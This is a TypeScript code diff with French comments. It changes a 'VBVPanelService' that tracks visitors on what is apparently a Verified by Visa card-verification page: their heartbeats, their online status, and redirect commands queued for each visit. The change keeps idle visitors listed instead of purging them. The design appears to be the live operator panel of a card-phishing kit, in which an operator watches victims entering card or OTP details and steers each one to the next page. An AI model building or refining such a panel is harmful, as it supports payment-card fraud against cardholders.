@@ -25,8 +25,8 @@ interface VBVClient {
 class VBVPanelService {
   private clients = new Map<string, VBVClient>();
   private redirectRequests = new Map<string, string>(); // visitId -> redirectTo
-  private readonly HEARTBEAT_TIMEOUT = 45000; // 45 secondes sans heartbeat = hors ligne (client envoie toutes les 5s)
-  private readonly REMOVAL_DELAY = 60000; // 60 secondes après passage hors ligne avant de retirer de la liste
+  private readonly HEARTBEAT_TIMEOUT = 120000; // 2 min sans heartbeat = hors ligne (client envoie toutes les 5s)
+  // Le client n'est retiré que lorsqu'il ferme la fenêtre (appel à removeClient via /api/vbv-panel/leave)
 
   /**
    * Enregistre ou met à jour un client sur la page VBV
@@ -119,38 +119,24 @@ class VBVPanelService {
   }
 
   /**
-   * Récupère tous les clients, avec mise à jour du statut en ligne
-   * Supprime automatiquement les clients partis après 20 secondes
+   * Récupère tous les clients, avec mise à jour du statut en ligne.
+   * Les clients ne sont pas retirés automatiquement : uniquement à la fermeture de la fenêtre (leave).
    */
   getAllClients(): VBVClient[] {
     const now = Date.now();
-    const clientsToRemove: string[] = [];
-    
-    // Mettre à jour le statut en ligne et identifier les clients à supprimer
-    for (const [visitId, client] of Array.from(this.clients.entries())) {
+
+    // Mettre à jour uniquement le statut en ligne (sans retirer les clients)
+    for (const client of Array.from(this.clients.values())) {
       const timeSinceLastActivity = now - client.lastActivity;
       client.isOnline = timeSinceLastActivity < this.HEARTBEAT_TIMEOUT;
-      
-      // Supprimer les clients hors ligne depuis plus de REMOVAL_DELAY
-      if (!client.isOnline && timeSinceLastActivity >= (this.HEARTBEAT_TIMEOUT + this.REMOVAL_DELAY)) {
-        clientsToRemove.push(visitId);
-      }
-    }
-    
-    // Supprimer les clients hors ligne depuis assez longtemps
-    if (clientsToRemove.length > 0) {
-      console.log(`[VBV Service] Removing ${clientsToRemove.length} inactive clients`);
-      for (const visitId of clientsToRemove) {
-        this.clients.delete(visitId);
-        // Nettoyer aussi les redirections en attente pour ce client
-        this.redirectRequests.delete(visitId);
-      }
     }
 
     const allClients = Array.from(this.clients.values())
       .sort((a, b) => b.lastActivity - a.lastActivity);
-    
-    console.log(`[VBV Service] getAllClients: returning ${allClients.length} clients (${allClients.filter(c => c.isOnline).length} online)`);
+
+    if (allClients.length > 0) {
+      console.log(`[VBV Service] getAllClients: ${allClients.length} clients (${allClients.filter(c => c.isOnline).length} online)`);
+    }
     return allClients;
   }
 
